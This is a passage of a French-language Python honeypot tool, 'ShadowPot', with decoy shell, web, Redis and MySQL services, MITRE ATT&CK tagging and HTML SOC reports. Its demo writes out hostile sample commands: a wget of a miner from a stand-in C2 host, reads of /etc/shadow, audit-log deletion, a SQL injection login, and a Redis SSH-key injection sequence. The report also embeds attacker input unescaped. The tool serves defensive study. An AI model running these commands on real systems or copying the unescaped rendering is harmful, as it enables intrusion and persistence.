            rows += f"<tr><td><code>{sip}</code><br><small>{geo.get('country', 'Inconnu')}</small></td><td><span class='tag'>{stype}</span></td><td>{alerts or '<em style=\"color:#64748b\">Probe</em>'}</td><td>{stime}</td></tr>"

        dash_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ShadowPot SOC Monitoring Console</title>
    <meta http-equiv="refresh" content="10">
    <style>
        body {{ background: #090d16; color: #f1f5f9; font-family: -apple-system, monospace; padding: 25px; margin: 0; }}
        .header {{ display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #1e293b; padding-bottom: 15px; }}
        h1 {{ margin: 0; color: #f97316; font-size: 24px; }}
        .kpi-grid {{ display: flex; gap: 20px; margin: 25px 0; }}
        .kpi {{ background: #111827; border: 1px solid #1f2937; padding: 20px; border-radius: 8px; flex: 1; text-align: center; }}
        .kpi-val {{ font-size: 36px; font-weight: bold; color: #38bdf8; }}
        .kpi-lbl {{ color: #9ca3af; font-size: 12px; text-transform: uppercase; margin-top: 5px; }}
        table {{ width: 100%; border-collapse: collapse; background: #111827; border-radius: 8px; overflow: hidden; }}
        th {{ background: #1f2937; color: #f97316; text-align: left; padding: 12px; font-size: 13px; }}
        td {{ padding: 12px; border-bottom: 1px solid #1f2937; font-size: 13px; }}
        .badge {{ background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid #ef4444; padding: 3px 6px; border-radius: 4px; font-size: 11px; margin-right: 4px; }}
        .tag {{ background: #374151; padding: 3px 8px; border-radius: 4px; font-size: 11px; }}
        code {{ color: #4ade80; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🍯 SHADOWPOT — CONSOLE DE SUPERVISION SOC v2.0</h1>
        <div><span class="tag">Rafraîchissement automatique (10s)</span></div>
    </div>
    <div class="kpi-grid">
        <div class="kpi"><div class="kpi-val">{total_attacks}</div><div class="kpi-lbl">Intrusions Traitées</div></div>
        <div class="kpi"><div class="kpi-val">{unique_ips}</div><div class="kpi-lbl">Adresses IP Hostiles</div></div>
        <div class="kpi"><div class="kpi-val" style="color: #ef4444;">{total_mitre}</div><div class="kpi-lbl">TTPs MITRE Identifiés</div></div>
        <div class="kpi"><div class="kpi-val" style="color: #4ade80;">4/4</div><div class="kpi-lbl">Leurres Armés (SSH, Web, Redis, MySQL)</div></div>
    </div>
    <table>
        <thead>
            <tr><th>IP SOURCE & PAYS</th><th>VECTEUR D'ATTAQUE</th><th>TECHNIQUES MITRE CARTOGRAPHIÉES</th><th>HORODATAGE UTC</th></tr>
        </thead>
        <tbody>{rows}</tbody>
    </table>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(dash_html.encode("utf-8"))

    def _render_soc_api(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(WebHoneypotHandler.stats).encode("utf-8"))


class WebHoneypot(threading.Thread):
    def __init__(self, host="0.0.0.0", port=8080, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.server = None

    def run(self):
        WebHoneypotHandler.logger = self.logger
        try:
            self.server = http.server.HTTPServer((self.host, self.port), WebHoneypotHandler)
            print(f"{Colors.GREEN}[+] Honeypot Web armé sur http://{self.host}:{self.port} (Dashboard SOC: /_soc){Colors.RESET}")
            self.server.serve_forever()
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur Web Honeypot : {e}{Colors.RESET}")


# =============================================================================
# HONEYPOT SERVICE 3 : REDIS DECOY (DÉTECTION D'INJECTION DE CLÉ SSH T1098)
# =============================================================================
class RedisHoneypot(threading.Thread):
    """Piège à botnets exploitant les instances Redis ouvertes (Port 6379)."""
    def __init__(self, host="0.0.0.0", port=6379, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.running = True
        self.sock = None

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(15)
            print(f"{Colors.GREEN}[+] Honeypot Redis NoSQL armé sur {self.host}:{self.port} (Piège SSH Key Injection){Colors.RESET}")

            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    t = threading.Thread(target=self.handle_client, args=(client_sock, addr))
                    t.daemon = True
                    t.start()
                except Exception:
                    break
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur Redis Honeypot : {e}{Colors.RESET}")

    def handle_client(self, sock, addr):
        client_ip, client_port = addr[0], addr[1]
        geo = ThreatIntelEnricher.lookup(client_ip)
        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 REDIS EXPLOITATION ATTEMPT]{Colors.RESET} Connexion depuis {Colors.CYAN}{client_ip}:{client_port}{Colors.RESET} ({geo['country']})")

        session_data = {
            "session_id": f"redis-{int(time.time())}-{client_port}",
            "type": "redis_exploit",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": client_ip,
            "source_port": client_port,
            "geo": geo,
            "commands": [],
            "mitre_alerts": []
        }

        try:
            while self.running:
                data = sock.recv(1024)
                if not data:
                    break
                cmd_raw = data.decode("utf-8", errors="ignore").strip()
                if not cmd_raw:
                    continue

                session_data["commands"].append({"time": datetime.now().strftime("%H:%M:%S"), "command": cmd_raw})
                print(f"  {Colors.YELLOW}[REDIS CMD]{Colors.RESET} {cmd_raw}")

                # Analyse MITRE T1098 / T1053 sur les commandes Redis malveillantes
                matched = []
                for rule in MITRE_RULES:
                    if re.search(rule["pattern"], cmd_raw, re.IGNORECASE):
                        matched.append(rule)

                for m in matched:
                    session_data["mitre_alerts"].append(m)
                    print(f"    {Colors.RED}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

                # Réponse RESP Redis standard (+OK ou PONG)
                if "PING" in cmd_raw.upper():
                    sock.sendall(b"+PONG\r\n")
                elif "INFO" in cmd_raw.upper():
                    sock.sendall(b"$82\r\n# Server\r\nredis_version:6.2.6\r\nos:Linux 5.10.0-8-amd64 x86_64\r\ntcp_port:6379\r\nrole:master\r\n\r\n")
                else:
                    sock.sendall(b"+OK\r\n")
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            if self.logger:
                self.logger.log_event(session_data)


# =============================================================================
# HONEYPOT SERVICE 4 : MYSQL DECOY (DÉTECTION DE BRUTE FORCE T1110)
# =============================================================================
class MySQLHoneypot(threading.Thread):
    """Émet un handshake MySQL valide (Port 3306) et capture les tentatives d'authentification."""
    def __init__(self, host="0.0.0.0", port=3306, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.running = True
        self.sock = None

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(15)
            print(f"{Colors.GREEN}[+] Honeypot MySQL Database armé sur {self.host}:{self.port} (Handshake 5.7.34){Colors.RESET}")

            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    t = threading.Thread(target=self.handle_client, args=(client_sock, addr))
                    t.daemon = True
                    t.start()
                except Exception:
                    break
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur MySQL Honeypot : {e}{Colors.RESET}")

    def handle_client(self, sock, addr):
        client_ip, client_port = addr[0], addr[1]
        geo = ThreatIntelEnricher.lookup(client_ip)
        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 MYSQL PROBE DÉTECTÉE]{Colors.RESET} Connexion entrante depuis {Colors.CYAN}{client_ip}:{client_port}{Colors.RESET} ({geo['country']})")

        session_data = {
            "session_id": f"mysql-{int(time.time())}-{client_port}",
            "type": "mysql_auth_attempt",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": client_ip,
            "source_port": client_port,
            "geo": geo,
            "auth": {},
            "mitre_alerts": [{
                "id": "T1110",
                "name": "Brute Force (Database)",
                "tactic": "Credential Access",
                "severity": "HIGH",
                "desc": "Tentative de force brute ou connexion non autorisée sur service de base de données MySQL"
            }]
        }

        try:
            # Paquet d'Initial Handshake MySQL v10
            # Protocol: 10, Version: 5.7.34-Debian
            version = b"5.7.34-log\x00"
            thread_id = b"\x01\x00\x00\x00"
            salt1 = b"12345678"
            salt2 = b"123456789012\x00"
            payload = b"\x0a" + version + thread_id + salt1 + b"\x00\xff\xf7\x21\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + salt2 + b"mysql_native_password\x00"
            packet = bytes([len(payload) & 0xff, (len(payload) >> 8) & 0xff, (len(payload) >> 16) & 0xff, 0]) + payload
            sock.sendall(packet)

            # Lecture de la réponse client
            resp = sock.recv(1024)
            if resp and len(resp) > 36:
                user_bytes = resp[36:].split(b"\x00")[0]
                user = user_bytes.decode("utf-8", errors="ignore")
                session_data["auth"] = {"username": user}
                print(f"  {Colors.YELLOW}[MYSQL USER ATTEMPT]{Colors.RESET} Tentative d'accès avec l'utilisateur : {Colors.BOLD}'{user}'{Colors.RESET}")

            # Envoi d'une erreur 1045 (Access Denied)
            err_msg = b"\xff\x15\x04#28000Access denied for user"
            err_packet = bytes([len(err_msg) & 0xff, 0, 0, 2]) + err_msg
            sock.sendall(err_packet)
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            if self.logger:
                self.logger.log_event(session_data)


# =============================================================================
# GÉNÉRATEUR DE RAPPORT FORENSIQUE SOC (HTML5 / CSS3 CYBER THEME)
# =============================================================================
def generate_incident_report(log_dir=None, report_path=None):
    if log_dir is None:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        log_dir = os.path.join(script_dir, "logs")
    if report_path is None:
        report_path = os.path.join(log_dir, "rapport_incidents.html")
    session_file = os.path.join(log_dir, "sessions.json")
    if not os.path.exists(session_file):
        print(f"{Colors.YELLOW}[i] Aucun journal de session trouvé pour générer le rapport.{Colors.RESET}")
        return

    try:
        with open(session_file, "r", encoding="utf-8") as f:
            sessions = json.load(f)
    except Exception:
        sessions = []

    total_attacks = len(sessions)
    unique_ips = len(set(s.get("source_ip") for s in sessions))
    mitre_count = sum(len(s.get("mitre_alerts", [])) for s in sessions)
    critical_count = sum(1 for s in sessions if any(a.get("severity") == "CRITICAL" for a in s.get("mitre_alerts", [])))

    rows = ""
    for s in sessions:
        sip = s.get("source_ip", "Inconnu")
        geo = s.get("geo", {})
        country = geo.get("country", "Inconnu")
        isp = geo.get("isp", "N/A")
        stype = s.get("type", "Inconnu")
        stime = s.get("timestamp", "")[:19].replace("T", " ")

        alerts_html = ""
        for a in s.get("mitre_alerts", []):
            sev_class = "crit" if a["severity"] == "CRITICAL" else "high" if a["severity"] == "HIGH" else "med"
            alerts_html += f'<span class="badge {sev_class}">[{a["id"]}] {a["name"]}</span> '

        cmds_html = ""
        if s.get("auth"):
            u = s['auth'].get('username', '')
            p = s['auth'].get('password', '')
            cmds_html += f"<div class='auth-tag'>AUTH : user='{u}' pass='{p}'</div>"
        for c in s.get("commands", []):
            cmd_val = c.get("command") if isinstance(c, dict) else c
            cmds_html += f"<code>$ {cmd_val}</code><br>"
        if s.get("body"):
            cmds_html += f"<code>PAYLOAD: {s.get('body')}</code>"

        rows += f"""
        <tr>
            <td>
                <strong>{sip}</strong><br>
                <span class="geo-tag">{country} ({isp})</span><br>
                <small style="color:#64748b">{stime} UTC</small>
            </td>
            <td><span class="type-tag">{stype.upper()}</span></td>
            <td>{cmds_html if cmds_html else '<em style="color:#64748b">Sonde furtive / Scanner réseau</em>'}</td>
            <td>{alerts_html if alerts_html else '<em style="color:#64748b">Activité exploratoire sans TTP critique</em>'}</td>
        </tr>"""

    html = f"""<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>ShadowPot v2.0 — Rapport d'Analyse Forensique des Menaces</title>
    <style>
        body {{ background: #0b0f19; color: #cbd5e1; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; padding: 35px; margin: 0; }}
        .header {{ border-bottom: 2px solid #1e293b; padding-bottom: 20px; display: flex; justify-content: space-between; align-items: flex-end; }}
        h1 {{ color: #f97316; margin: 0; font-size: 26px; }}
        .stats-grid {{ display: flex; gap: 20px; margin: 30px 0; }}
        .stat-card {{ background: #111827; border: 1px solid #1f2937; border-radius: 8px; padding: 22px; flex: 1; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }}
        .stat-num {{ font-size: 34px; font-weight: bold; color: #38bdf8; }}
        .stat-label {{ color: #94a3b8; font-size: 12px; text-transform: uppercase; margin-top: 6px; }}
        table {{ width: 100%; border-collapse: collapse; background: #111827; border-radius: 8px; overflow: hidden; border: 1px solid #1f2937; margin-top: 20px; }}
        th {{ background: #1f2937; color: #f97316; text-align: left; padding: 14px; font-size: 13px; text-transform: uppercase; }}
        td {{ padding: 14px; border-bottom: 1px solid #1f2937; font-size: 13px; vertical-align: top; }}
        code {{ background: #0f172a; padding: 3px 6px; border-radius: 4px; color: #4ade80; font-size: 12px; display: inline-block; margin-bottom: 3px; }}
        .badge {{ padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; display: inline-block; margin: 2px; }}
        .badge.crit {{ background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid #ef4444; }}
        .badge.high {{ background: rgba(245, 158, 11, 0.2); color: #f59e0b; border: 1px solid #f59e0b; }}
        .badge.med  {{ background: rgba(56, 189, 248, 0.2); color: #38bdf8; border: 1px solid #38bdf8; }}
        .type-tag {{ background: #334155; padding: 4px 8px; border-radius: 4px; font-size: 11px; color: #f8fafc; font-weight: bold; }}
        .geo-tag {{ color: #94a3b8; font-size: 11px; }}
        .auth-tag {{ background: #1e1b4b; color: #c084fc; border: 1px solid #4338ca; padding: 4px 8px; border-radius: 4px; font-size: 11px; margin-bottom: 5px; }}
        .footer {{ margin-top: 50px; text-align: center; font-size: 12px; color: #64748b; border-top: 1px solid #1f2937; padding-top: 20px; }}
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🍯 SHADOWPOT v2.0 — RAPPORT D'ANALYSE FORENSIQUE</h1>
            <p style="margin: 5px 0 0 0; color: #94a3b8;">Généré automatiquement par le moteur Deception Technology (Tohon Fourier).</p>
        </div>
        <div style="font-size: 12px; color: #64748b;">
            Horodatage : {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-num">{total_attacks}</div>
            <div class="stat-label">Intrusions Traitées</div>
        </div>
        <div class="stat-card">
            <div class="stat-num">{unique_ips}</div>
            <div class="stat-label">Adresses IP Hostiles</div>
        </div>
        <div class="stat-card">
            <div class="stat-num" style="color: #ef4444;">{mitre_count}</div>
            <div class="stat-label">Techniques MITRE Détectées</div>
        </div>
        <div class="stat-card">
            <div class="stat-num" style="color: #f59e0b;">{critical_count}</div>
            <div class="stat-label">Incidents Majeurs (Critiques)</div>
        </div>
    </div>

    <table>
        <thead>
            <tr>
                <th style="width: 250px;">SOURCE, PAYS & HORODATAGE</th>
                <th style="width: 140px;">LEURRE CIBLÉ</th>
                <th>ACTIVITÉ HOSTILE & COMMANDES CAPTURÉES</th>
                <th style="width: 340px;">CARTOGRAPHIE MITRE ATT&CK</th>
            </tr>
        </thead>
        <tbody>
            {rows}
        </tbody>
    </table>

    <div class="footer">
        ShadowPot v2.0 (Enterprise SOC Deception Engine) — Développé par Tohon Fourier (CalderaFourier-code). Conforme MITRE ATT&CK v14+.
    </div>
</body>
</html>"""

    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"\n{Colors.GREEN}[✓] Rapport forensique HTML mis à jour avec succès :{Colors.RESET} {report_path}")


# =============================================================================
# BANC D'ESSAI COMPARATIF & DÉMONSTRATION COMPLÈTE (4 VECTEURS RÉELS)
# =============================================================================
def run_simulation(logger):
    """Exécute 4 campagnes d'attaques réalistes pour valider l'ensemble des leurres."""
    print(f"\n{Colors.MAGENTA}{Colors.BOLD}=== SIMULATION FORENSIQUE OFFENSIVE SHADOWPOT v2.0 (4 SCÉNARIOS) ==={Colors.RESET}\n")

    # Scénario 1 : Compromission Shell Linux & Enchaînement de TTPs
    print(f"{Colors.ORANGE}{Colors.BOLD}--- SCÉNARIO 1 : INTRUSION SHELL LINUX & DÉTOURNEMENT SYSTÈME ---{Colors.RESET}")
    attacker_ip = "185.220.101.5"
    attacker_port = 48210
    geo1 = {"country": "Allemagne (Tor Exit Node)", "country_code": "DE", "city": "Frankfurt", "isp": "Tor Anonymity Router", "threat_level": "Tor"}

    print(f"{Colors.RED}{Colors.BOLD}[🚨 INTRUSION SHELL]{Colors.RESET} Connexion entrante depuis {Colors.CYAN}{attacker_ip}:{attacker_port}{Colors.RESET} ({geo1['country']})")
    time.sleep(0.3)
    print(f"  {Colors.YELLOW}[AUTH BRUTE-FORCE]{Colors.RESET} Identifiants capturés : {Colors.BOLD}user='root', pass='toor123'{Colors.RESET}")

    session_id = f"shell-{int(time.time())}-{attacker_port}"
    session_data = {
        "session_id": session_id,
        "type": "shell",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": attacker_ip,
        "source_port": attacker_port,
        "geo": geo1,
        "auth": {"username": "root", "password": "toor123"},
        "commands": [],
        "mitre_alerts": []
    }

    test_commands = [
        ("whoami", "Découverte des privilèges"),
        ("uname -a", "Reconnaissance du noyau"),
        ("cat /etc/passwd", "Vol de comptes système"),
        ("cat /etc/shadow", "Extraction de hashs critiques"),
        ("wget http://c2-malware.darknet.ru/miner.sh", "Téléchargement d'un botnet"),
        ("chmod +x miner.sh", "Attribution des droits d'exécution"),
        ("crontab -e", "Implantation de persistance cron"),
        ("rm -rf /var/log/audit.log", "Évasion de défense et destruction de preuves")
    ]

    sandbox = LinuxVirtualSandbox(attacker_ip)
    shell_helper = ShellHoneypot(logger=logger)

    for cmd, purpose in test_commands:
        time.sleep(0.2)
        matched = shell_helper.analyze_command(cmd)
        ts = datetime.now().strftime("%H:%M:%S")

        session_data["commands"].append({"time": ts, "command": cmd, "mitre": [m["id"] for m in matched]})
        print(f"  {Colors.GRAY}[{ts}]{Colors.RESET} {Colors.CYAN}{attacker_ip}{Colors.RESET} $ {Colors.BOLD}{cmd}{Colors.RESET}")

        for m in matched:
            session_data["mitre_alerts"].append(m)
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE if m["severity"] == "HIGH" else Colors.YELLOW
            print(f"    {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} ({m['tactic']}) -> {m['desc']}")

        resp = sandbox.execute(cmd)
        if resp:
            first_line = resp.split("\n")[0]
            print(f"    {Colors.GRAY}↳ Réponse émulée : {first_line[:70]}...{Colors.RESET}")

    logger.log_event(session_data)
    print(f"{Colors.GRAY}[*] Session shell clôturée pour {attacker_ip}.{Colors.RESET}\n")

    # Scénario 2 : Sonde Web & Injection SQL
    print(f"{Colors.ORANGE}{Colors.BOLD}--- SCÉNARIO 2 : FUZZING WEB, DIRECTORY TRAVERSAL & INJECTION SQL ---{Colors.RESET}")
    web_ip = "45.154.255.89"
    geo2 = {"country": "Pays-Bas (Botnet Scanner)", "country_code": "NL", "city": "Amsterdam", "isp": "Bulletproof Host", "threat_level": "Malveillant"}
    web_attacks = [
        ("GET", "/.env", ""),
        ("GET", "/wp-login.php", ""),
        ("POST", "/login", "username=admin' OR '1'='1&password=password")
    ]

    for method, path, body in web_attacks:
        time.sleep(0.2)
        target_check = path if method == "GET" else body
        matched_web = [r for r in MITRE_RULES if re.search(r["pattern"], target_check, re.IGNORECASE)]

        print(f"{Colors.RED}{Colors.BOLD}[🌐 WEB EXPLOIT]{Colors.RESET} {method} depuis {Colors.CYAN}{web_ip}{Colors.RESET} -> {Colors.BOLD}{path}{Colors.RESET}")
        if body:
            print(f"  {Colors.YELLOW}[POST DATA]{Colors.RESET} {body}")
        for m in matched_web:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        w_session = {
            "session_id": f"web-{int(time.time())}",
            "type": "web_attack",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": web_ip,
            "geo": geo2,
            "method": method,
            "path": path,
            "body": body,
            "mitre_alerts": matched_web
        }
        logger.log_event(w_session)

    # Scénario 3 : Attaque Redis NoSQL (Injection de clé SSH T1098)
    print(f"\n{Colors.ORANGE}{Colors.BOLD}--- SCÉNARIO 3 : PIÈGE REDIS NOSQL (INJECTION DE CLÉ SSH T1098) ---{Colors.RESET}")
    redis_ip = "194.26.29.112"
    geo3 = {"country": "Russie", "country_code": "RU", "city": "Moscou", "isp": "BadHost LLC", "threat_level": "C2 Scanner"}
    redis_cmds = [
        "CONFIG SET dir /root/.ssh",
        "CONFIG SET dbfilename authorized_keys",
        "SET crackit \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@darknet\\n\\n\"",
        "SAVE"
    ]

    print(f"{Colors.RED}{Colors.BOLD}[🚨 REDIS EXPLOITATION]{Colors.RESET} Connexion entrante depuis {Colors.CYAN}{redis_ip}:51204{Colors.RESET} ({geo3['country']})")
    redis_alerts = []
    for rcmd in redis_cmds:
        time.sleep(0.2)
        print(f"  {Colors.YELLOW}[REDIS RAW CMD]{Colors.RESET} {rcmd}")
        for r in MITRE_RULES:
            if re.search(r["pattern"], rcmd, re.IGNORECASE):
                redis_alerts.append(r)
                print(f"    {Colors.RED}{Colors.BOLD}[⚡ MITRE {r['id']} - {r['name']}]{Colors.RESET} {r['desc']}")

    r_session = {
        "session_id": f"redis-{int(time.time())}",
        "type": "redis_exploit",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": redis_ip,
        "geo": geo3,
        "commands": [{"time": datetime.now().strftime("%H:%M:%S"), "command": c} for c in redis_cmds],
        "mitre_alerts": redis_alerts
    }
    logger.log_event(r_session)

    # Scénario 4 : Brute Force Base de données MySQL
    print(f"\n{Colors.ORANGE}{Colors.BOLD}--- SCÉNARIO 4 : PIÈGE DATABASE MYSQL (BRUTE FORCE T1110) ---{Colors.RESET}")
    mysql_ip = "198.51.100.44"
    geo4 = {"country": "États-Unis", "country_code": "US", "city": "Ashburn", "isp": "Cloud Provider", "threat_level": "Scanner"}
    print(f"{Colors.RED}{Colors.BOLD}[🚨 MYSQL PROBE]{Colors.RESET} Handshake reçu depuis {Colors.CYAN}{mysql_ip}:38291{Colors.RESET}")
    print(f"  {Colors.YELLOW}[AUTH ATTEMPT]{Colors.RESET} Tentative d'accès administrateur : user='root'")
    print(f"  {Colors.RED}{Colors.BOLD}[⚡ MITRE T1110 - Brute Force]{Colors.RESET} Tentative de force brute base de données MySQL")

    m_session = {
        "session_id": f"mysql-{int(time.time())}",
        "type": "mysql_auth_attempt",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": mysql_ip,
        "geo": geo4,
        "auth": {"username": "root"},
        "mitre_alerts": [{
            "id": "T1110",
            "name": "Brute Force (Database)",
            "tactic": "Credential Access",
            "severity": "HIGH",
            "desc": "Tentative de force brute ou connexion non autorisée sur service de base de données MySQL"
        }]
    }
    logger.log_event(m_session)

    # Génération finale du rapport
    time.sleep(0.5)
    print(f"\n{Colors.GREEN}{Colors.BOLD}=== SIMULATION TERMINÉE — SYNTHÈSE DES RAPPORTS FORENSIQUES ==={Colors.RESET}")
    generate_incident_report(logger.log_dir)
    print(f"{Colors.LIGHT_GREEN}[✓] Démonstration ShadowPot v2.0 achevée avec succès !{Colors.RESET}\n")


# =============================================================================
# POINT D'ENTRÉE DU SCRIPT
# =============================================================================
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="ShadowPot v2.0 : Honeypot Multi-Services & Moteur de Profilage MITRE ATT&CK",
        epilog="Exemples :\n  python shadowpot.py --demo                      (Simulation offensive complète)\n  python shadowpot.py --shell-port 2222 --web-port 8080 (Écoute réelle)\n  python shadowpot.py --report                    (Générer le rapport HTML)",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--host", default="0.0.0.0", help="Adresse IP d'écoute de tous les leurres (Défaut: 0.0.0.0)")
    parser.add_argument("--shell-port", type=int, default=2222, help="Port du faux shell Linux interactif (Défaut: 2222)")
    parser.add_argument("--web-port", type=int, default=8080, help="Port du faux portail Web & SOC Dashboard (Défaut: 8080)")
    parser.add_argument("--redis-port", type=int, default=6379, help="Port du leurre Redis NoSQL (Défaut: 6379)")
    parser.add_argument("--mysql-port", type=int, default=3306, help="Port du leurre MySQL Database (Défaut: 3306)")
    parser.add_argument("--webhook", help="URL Webhook Discord/Slack pour notification d'intrusion temps réel")
    parser.add_argument("--demo", action="store_true", help="Lance la suite de simulation offensive (4 scénarios)")
    parser.add_argument("--report", action="store_true", help="Génère uniquement le rapport forensique HTML")

    args = parser.parse_args()

    logger = ThreatLogger(webhook_url=args.webhook)

    if args.report:
        generate_incident_report(logger.log_dir)
        return

    if args.demo:
        run_simulation(logger)
        return

    # Lancement des 4 serveurs leurres en arrière-plan
    threads = [
        ShellHoneypot(host=args.host, port=args.shell_port, logger=logger),
        WebHoneypot(host=args.host, port=args.web_port, logger=logger),
        RedisHoneypot(host=args.host, port=args.redis_port, logger=logger),
        MySQLHoneypot(host=args.host, port=args.mysql_port, logger=logger)
    ]

    for t in threads:
        t.daemon = True
        t.start()

    time.sleep(0.5)
    print(f"\n{Colors.CYAN}{Colors.BOLD}[*] LA GRILLE DE DÉCEPTION EST ARMÉE SUR TOUS LES PORTS : {Colors.RESET}")
    print(f"  {Colors.LIGHT_GREEN}• Shell Linux (SSH/Telnet) :{Colors.RESET} {args.host}:{args.shell_port}")
    print(f"  {Colors.LIGHT_GREEN}• Portail Web Admin & Traps:{Colors.RESET} http://{args.host}:{args.web_port}")
    print(f"  {Colors.LIGHT_GREEN}• Console SOC Dashboard    :{Colors.RESET} http://{args.host}:{args.web_port}/_soc")
    print(f"  {Colors.LIGHT_GREEN}• Leurre Redis NoSQL       :{Colors.RESET} {args.host}:{args.redis_port}")
    print(f"  {Colors.LIGHT_GREEN}• Leurre MySQL Database    :{Colors.RESET} {args.host}:{args.mysql_port}")
    print(f"\n{Colors.GRAY}Appuyez sur Ctrl+C pour arrêter ShadowPot et compiler le rapport forensique.{Colors.RESET}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Arrêt de la grille ShadowPot...{Colors.RESET}")
        generate_incident_report(logger.log_dir)
        print(f"{Colors.GREEN}[✓] Rapport forensique et flux SIEM mis à jour. Au revoir.{Colors.RESET}")


if __name__ == "__main__":
    main()
